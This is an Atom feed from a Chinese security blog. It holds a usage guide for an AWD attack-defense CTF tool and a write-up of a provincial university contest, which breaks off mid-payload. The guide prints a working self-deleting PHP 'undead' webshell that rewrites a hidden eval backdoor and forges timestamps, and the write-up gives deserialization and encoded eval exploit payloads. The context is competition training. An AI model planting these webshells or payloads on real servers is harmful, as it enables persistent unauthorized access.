<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>网络安全知识分享</title>
  
  <subtitle>人生何处不青山</subtitle>
  <link href="https://www.lewiserii.top/atom.xml" rel="self"/>
  
  <link href="https://www.lewiserii.top/"/>
  <updated>2023-12-22T07:13:43.963Z</updated>
  <id>https://www.lewiserii.top/</id>
  
  <author>
    <name>dr0n</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>python反序列化</title>
    <link href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html"/>
    <id>https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html</id>
    <published>2023-12-22T01:00:00.000Z</published>
    <updated>2023-12-22T07:13:43.963Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="27c08399f4c848553492bda6abcdeff969a110ef1f93130936c2f930fa3ff301"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="总结" scheme="https://www.lewiserii.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="反序列化" scheme="https://www.lewiserii.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="总结" scheme="https://www.lewiserii.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="python" scheme="https://www.lewiserii.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>awd工具开发&amp;使用说明</title>
    <link href="https://www.lewiserii.top/awd/awd%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91&amp;%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E.html"/>
    <id>https://www.lewiserii.top/awd/awd%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91&amp;%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E.html</id>
    <published>2023-12-07T06:00:00.000Z</published>
    <updated>2023-12-11T08:00:35.539Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ip生成"><a href="#ip生成" class="headerlink" title="ip生成"></a>ip生成</h2><blockquote><p>使用场景：裁判只给了一个C段（192.168.10.0），并说所有队伍的靶机都在这个C段中，具体ip需要自己发现</p></blockquote><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-2.png"></p><p>输入<code>192.168.10.*</code>(用*占位)即可在程序当前运行目录下生成一个<code>ip.txt</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs text">192.168.10.1:80<br>192.168.10.2:80<br>192.168.10.3:80<br>192.168.10.4:80<br>192.168.10.5:80<br>192.168.10.6:80<br>...<br>...<br>192.168.10.251:80<br>192.168.10.252:80<br>192.168.10.253:80<br>192.168.10.254:80<br>192.168.10.255:80<br></code></pre></td></tr></table></figure><p>单ip多端口适用于所有题目在同一个ip地址上，但是使用的端口不同</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-3.png"></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">192.168.100.103:10000<br>192.168.100.103:10001<br>192.168.100.103:10002<br>192.168.100.103:10003<br>192.168.100.103:10004<br>...<br>...<br>192.168.100.103:10197<br>192.168.100.103:10198<br>192.168.100.103:10199<br>192.168.100.103:10200<br></code></pre></td></tr></table></figure><h2 id="bugku专用"><a href="#bugku专用" class="headerlink" title="bugku专用"></a>bugku专用</h2><blockquote><p>使用场景：这个模块是针对线上的域名生成 例如 192-168-1-X.pvp3553.bugku.cn</p></blockquote><p>输入<code>192-168-1-&#123;1-255&#125;.pvp3553.bugku.cn</code>即可,<code>&#123;&#125;</code>中表示生成的范围，以<code>-</code>分割</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">192-168-1-&#123;1-255&#125;.pvp3553.bugku.cn<br>192-168-&#123;1-2&#125;-&#123;1-255&#125;.pvp3553.bugku.cn<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-4.png"></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">192-168-1-1.pvp3553.bugku.cn<br>192-168-1-2.pvp3553.bugku.cn<br>192-168-1-3.pvp3553.bugku.cn<br>192-168-1-4.pvp3553.bugku.cn<br>192-168-1-5.pvp3553.bugku.cn<br>...<br>...<br>192-168-1-252.pvp3553.bugku.cn<br>192-168-1-253.pvp3553.bugku.cn<br>192-168-1-254.pvp3553.bugku.cn<br>192-168-1-255.pvp3553.bugku.cn<br></code></pre></td></tr></table></figure><h2 id="目标扫描"><a href="#目标扫描" class="headerlink" title="目标扫描"></a>目标扫描</h2><blockquote><p>使用场景：在我们自己生成所有人的ip或者通过平台下载后，进行特征扫描来分辨题目（多道web或pwn题目）</p></blockquote><p>先打开自己的web靶机，输入网页上可以看到的特征即可</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-5.png"></p><p>pwn靶机也是同理，先连上自己的看看会输出什么就填什么</p><h2 id="写入不死马"><a href="#写入不死马" class="headerlink" title="写入不死马"></a>写入不死马</h2><blockquote><p>使用场景：发现某道题目的一个后门或者rce后写入不死马</p></blockquote><p><strong>在可以rce的参数后加<code>*</code></strong></p><p>Get传参后门：</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-6.png"></p><p>Post传参后门：</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-7.png"></p><p>可写路径：一般默认为空，当某些靶机的web根目录不可写时需要手动指定，例如指定写入到<code>/var/www/html/include/</code></p><h3 id="自定义不死马"><a href="#自定义不死马" class="headerlink" title="自定义不死马"></a>自定义不死马</h3><blockquote><p>使用场景：想自定义不死马的内容</p></blockquote><p>当勾选这个功能后，可以自定义不死马的内容</p><p>例如我自己的不死马如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.666.php&#x27;</span>;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;56183c1f36ef08fb8b027a4116db8483&quot;)&#123;@eval($_POST[&quot;a&quot;]);&#125; ?&gt;&#x27;</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .l.php&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>base64</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">PD<span class="hljs-number">9</span>waHAKICAgIGl<span class="hljs-symbol">nbm9</span>yZV<span class="hljs-number">91</span>c<span class="hljs-number">2</span>VyX<span class="hljs-number">2</span>Fib<span class="hljs-number">3</span>J<span class="hljs-number">0</span>KHRydWUpOwogICAgc<span class="hljs-number">2</span>V<span class="hljs-number">0</span>X<span class="hljs-number">3</span>RpbWVfbGltaXQoMCk<span class="hljs-number">7</span>CiAgICB<span class="hljs-number">1</span>bmxpbmsoX<span class="hljs-number">19</span>GSUxFX<span class="hljs-number">18</span>pOwogICAgJGZpbGUgPSA<span class="hljs-symbol">nLjY2</span><span class="hljs-symbol">Ni5</span>waHA<span class="hljs-symbol">nOwogICAgJGNvZGUgPSAnPD9</span>waHAgaWYobWQ<span class="hljs-number">1</span>KCRfR<span class="hljs-number">0</span>VUWyJwYX<span class="hljs-symbol">NzIl0</span>pPT<span class="hljs-number">0</span>i<span class="hljs-symbol">NTYxODNjMWYzNmVmMDhmYjhiMDI3</span>YTQxMTZkYj<span class="hljs-name">g0</span>ODMiKXtAZXZhbCgkX<span class="hljs-number">1</span>BPU<span class="hljs-number">1</span>RbImEiXSk<span class="hljs-number">7</span>fSA/Pic<span class="hljs-number">7</span>CiAgICB<span class="hljs-number">3</span>aGlsZSAoMSl<span class="hljs-number">7</span>CiAgICAgICAgZmlsZV<span class="hljs-number">9</span>wdXRfY<span class="hljs-number">29</span>udGVudHMoJGZpbGUsJG<span class="hljs-symbol">NvZGUpOwogICAgICAgIHN5</span>c<span class="hljs-number">3</span>RlbSg<span class="hljs-symbol">ndG91</span>Y<span class="hljs-number">2</span>ggLW<span class="hljs-number">0</span>gLWQgIjIwMTgtMTItMDEgMDk<span class="hljs-number">6</span>MTA<span class="hljs-number">6</span>MTIiIC<span class="hljs-number">5</span>sL<span class="hljs-symbol">nBocCcpOwogICAgICAgIHVzbGVlcCgxKTsKICAgIH0</span>KPz<span class="hljs-number">4</span>=<br></code></pre></td></tr></table></figure><p>需要在自定义马访问路径中填写访问马的名字</p><blockquote><p>支持从文件拖放到textedit中(也需要base64)</p></blockquote><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-8.png"></p><h3 id="随机文件名"><a href="#随机文件名" class="headerlink" title="随机文件名"></a>随机文件名</h3><blockquote><p>使用场景：防止其他队伍监控流量进行蹭车</p></blockquote><p>勾选后写入的shell的文件名，密码，连接参数随机产生</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-14.png"></p><h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><blockquote><p>使用场景：当批量种上不死马后进行命令执行</p></blockquote><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-9.png"></p><p>当使用了 <strong>随机文件名</strong> 的功能进行写马后可以填入文件名和命令进行自动利用</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-15.png"></p><h3 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h3><blockquote><p>使用场景：批量执行获取flag的命令后批量搜集</p></blockquote><p>某些平台的flag位于&#x2F;，需要执行<code>cat /flag</code>，某些平台需要执行<code>curl</code>命令到裁判机获取flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-10.png"></p><p>点击获取flag按钮后，程序会自动在返回的结果中搜索包含<code>flag&#123;&#125;</code>的值并保存到<code>flag.txt</code>中</p><p>如果flag格式并不是<code>flag&#123;&#125;</code>，则可以自定义匹配的正则表达式</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-11.png"></p><h2 id="提交flag"><a href="#提交flag" class="headerlink" title="提交flag"></a>提交flag</h2><blockquote><p>使用场景：批量获取到flag后自动访问提交接口进行提交flag</p></blockquote><p><strong>flag用*占位</strong></p><p>Get方式：<code>http://192.168.100.103:19999/api/flag?token=xxxx&amp;flag=xxxx</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-12.png"></p><p>Post方式：</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-16.png"></p><h2 id="解码工具"><a href="#解码工具" class="headerlink" title="解码工具"></a>解码工具</h2><blockquote><p>使用场景：base64和url的编码与解码，行去重</p></blockquote><p>支持拖放文件</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-17.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ip生成&quot;&gt;&lt;a href=&quot;#ip生成&quot; class=&quot;headerlink&quot; title=&quot;ip生成&quot;&gt;&lt;/a&gt;ip生成&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;使用场景：裁判只给了一个C段（192.168.10.0），并说所有队伍的靶机都在这个C段中，具体i</summary>
      
    
    
    
    <category term="awd" scheme="https://www.lewiserii.top/categories/awd/"/>
    
    
    <category term="awd" scheme="https://www.lewiserii.top/tags/awd/"/>
    
    <category term="自动化工具" scheme="https://www.lewiserii.top/tags/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>第六届浙江省大学生网络与信息安全竞赛-WP</title>
    <link href="https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/%E7%AC%AC%E5%85%AD%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bwp.html"/>
    <id>https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/%E7%AC%AC%E5%85%AD%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bwp.html</id>
    <published>2023-11-11T04:00:00.000Z</published>
    <updated>2023-11-13T13:27:21.560Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="初赛-easy-php"><a href="#初赛-easy-php" class="headerlink" title="初赛[easy php]"></a>初赛[easy php]</h2><p>签到题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AAA</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;done&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BBB</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$param1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__debuginfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> [<br>            <span class="hljs-string">&#x27;debugInfo&#x27;</span> =&gt; <span class="hljs-string">&#x27;param1&#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;param1<br>        ];<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CCC</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;func-&gt;<span class="hljs-title function_ invoke__">aaa</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">BBB</span>();<br><span class="hljs-variable">$a</span>-&gt;param1 = <span class="hljs-keyword">new</span> CCC;<br><span class="hljs-variable">$a</span>-&gt;param1-&gt;func = <span class="hljs-keyword">new</span> AAA;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><h2 id="初赛-can-you-read-flag"><a href="#初赛-can-you-read-flag" class="headerlink" title="初赛[can you read flag]"></a>初赛[can you read flag]</h2><blockquote><p>好像做复杂了</p></blockquote><p>访问页面返回<code>//eval($_GET[a]);</code></p><p>爆破一下看哪些符号能用</p><p>可以用取反，例如<code>(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);</code></p><p>发现根目录有<code>flag</code>和<code>readflag</code>，flag没有权限读取</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-web1-1.png"></p><p>base64转一下读取readflag</p><p><code>(~%8C%86%8C%8B%9A%92)(~%9D%9E%8C%9A%C9%CB%DF%D0%8D%9A%9E%9B%99%93%9E%98);</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-web1-2.png"></p><p>执行readflag后要先输入一个<code>y</code>，然后进入循环开始计算式子，大概成功计算100多轮后读取flag并输出</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-web1-3.png"></p><p>靶机的web目录不能读写，在&#x2F;tmp目录下写一个php脚本用来计算</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$desc</span>=<span class="hljs-keyword">array</span>(<br>        <span class="hljs-number">0</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>),<br>        <span class="hljs-number">1</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<br>        <span class="hljs-number">2</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;file&quot;</span>,<span class="hljs-string">&quot;/tmp/error-output.txt&quot;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>);<br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-string">&quot;/readflag&quot;</span>,<span class="hljs-variable">$desc</span>,<span class="hljs-variable">$handle</span>);<br><span class="hljs-title function_ invoke__">is_resource</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$wh</span>=<span class="hljs-variable">$handle</span>[<span class="hljs-number">0</span>];<br><span class="hljs-variable">$rh</span>=<span class="hljs-variable">$handle</span>[<span class="hljs-number">1</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$rh</span> <span class="hljs-subst">$wh</span> open\n&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$handle</span>);<br><span class="hljs-variable">$read</span>=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$rh</span>,<span class="hljs-number">2096</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$read</span>\n&quot;</span>;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$wh</span>,<span class="hljs-string">&#x27;y&#x27;</span>);<br><br><span class="hljs-variable">$read</span>=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$rh</span>,<span class="hljs-number">2048</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;read: &quot;</span>.<span class="hljs-variable">$read</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$read</span>=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$rh</span>,<span class="hljs-number">2048</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$i</span>:<span class="hljs-subst">$read</span>\n&quot;</span>;<br><span class="hljs-variable">$op</span>=<span class="hljs-string">&quot;\$value=&quot;</span>.<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">strtok</span>(<span class="hljs-variable">$read</span>,<span class="hljs-string">&quot; =&quot;</span>)).<span class="hljs-string">&#x27;;&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$op</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$op</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$value</span>.<span class="hljs-string">&quot;\n&quot;</span>.<span class="hljs-variable">$op</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$wh</span>,<span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-variable">$value</span>).PHP_EOL);<br><span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">200</span>)&#123;<br>    <span class="hljs-variable">$read</span>=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$rh</span>,<span class="hljs-number">2048</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$i</span>:<span class="hljs-subst">$read</span>\n&quot;</span>;<br>    <span class="hljs-variable">$op</span>=<span class="hljs-string">&quot;\$value=&quot;</span>.<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">strtok</span>(<span class="hljs-variable">$read</span>,<span class="hljs-string">&quot; =&quot;</span>)).<span class="hljs-string">&#x27;;&#x27;</span>;<br><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$op</span>);<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$wh</span>,<span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-variable">$value</span>).PHP_EOL);<br>        <span class="hljs-variable">$i</span>++;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(~%<span class="hljs-number">8</span>C%<span class="hljs-number">86</span>%<span class="hljs-number">8</span>C%<span class="hljs-number">8</span>B%<span class="hljs-number">9</span>A%<span class="hljs-number">92</span>)(~%D7%<span class="hljs-number">9</span>A%<span class="hljs-number">9</span>C%<span class="hljs-number">97</span>%<span class="hljs-number">90</span>%DF%DD%AF%BB%C6%<span class="hljs-number">88</span>%<span class="hljs-number">9</span>E%B7%BE%B1%BC%<span class="hljs-number">98</span>%CF%B4%B5%B8%AD%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>C%CD%B2%C6%A6%A7%B5%<span class="hljs-number">86</span>%A6%A7%<span class="hljs-number">94</span>%<span class="hljs-number">90</span>%BB%AE%<span class="hljs-number">90</span>%B5%B2%BB%CF%D4%A6%A7%B5%<span class="hljs-number">86</span>%A6%A7%<span class="hljs-number">94</span>%<span class="hljs-number">90</span>%B6%<span class="hljs-number">91</span>%BD%<span class="hljs-number">8</span>F%<span class="hljs-number">9</span>C%B8%AA%<span class="hljs-number">96</span>%B3%BC%<span class="hljs-number">9</span>B%<span class="hljs-number">86</span>%B5%<span class="hljs-number">86</span>%<span class="hljs-number">94</span>%<span class="hljs-number">8</span>C%BB%AE%<span class="hljs-number">90</span>%B5%B2%AB%CF%D4%A6%A7%B5%<span class="hljs-number">86</span>%A6%A7%<span class="hljs-number">94</span>%<span class="hljs-number">90</span>%B6%<span class="hljs-number">91</span>%BD%<span class="hljs-number">8</span>F%<span class="hljs-number">9</span>C%B8%AA%<span class="hljs-number">96</span>%B3%BC%<span class="hljs-number">9</span>B%CC%B5%<span class="hljs-number">86</span>%<span class="hljs-number">94</span>%<span class="hljs-number">8</span>C%BB%AE%<span class="hljs-number">90</span>%B5%B2%<span class="hljs-number">95</span>%CF%D4%A6%A7%B5%<span class="hljs-number">86</span>%A6%A7%<span class="hljs-number">94</span>%<span class="hljs-number">90</span>%B6%<span class="hljs-number">92</span>%A5%<span class="hljs-number">8</span>F%<span class="hljs-number">9</span>D%B8%AA%<span class="hljs-number">96</span>%B3%BC%B6%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>B%B8%CE%<span class="hljs-number">88</span>%B3%CD%A9%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%C6%<span class="hljs-number">86</span>%B3%A8%C6%CE%<span class="hljs-number">9</span>B%B7%BD%CE%<span class="hljs-number">9</span>B%BC%CA%CF%<span class="hljs-number">9</span>A%B7%AE%<span class="hljs-number">96</span>%B3%BC%<span class="hljs-number">9</span>B%<span class="hljs-number">97</span>%B5%<span class="hljs-number">86</span>%<span class="hljs-number">94</span>%B1%BC%<span class="hljs-number">96</span>%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">94</span>%A6%AB%CE%<span class="hljs-number">88</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%C6%<span class="hljs-number">95</span>%A7%CD%C6%<span class="hljs-number">88</span>%A5%A8%CB%<span class="hljs-number">90</span>%B6%<span class="hljs-number">96</span>%C6%<span class="hljs-number">86</span>%A5%A8%B9%<span class="hljs-number">94</span>%A5%<span class="hljs-number">92</span>%<span class="hljs-number">87</span>%<span class="hljs-number">97</span>%A5%<span class="hljs-number">86</span>%B6%<span class="hljs-number">8</span>C%B5%B8%AD%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>C%CD%B2%<span class="hljs-number">8</span>C%B5%B8%<span class="hljs-number">97</span>%<span class="hljs-number">97</span>%<span class="hljs-number">9</span>D%<span class="hljs-number">92</span>%AD%<span class="hljs-number">8</span>C%A5%AC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">8</span>F%<span class="hljs-number">8</span>F%<span class="hljs-number">9</span>C%CE%C6%<span class="hljs-number">86</span>%A5%A7%B1%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>B%A7%B5%<span class="hljs-number">95</span>%A5%AC%<span class="hljs-number">98</span>%<span class="hljs-number">94</span>%A6%AC%<span 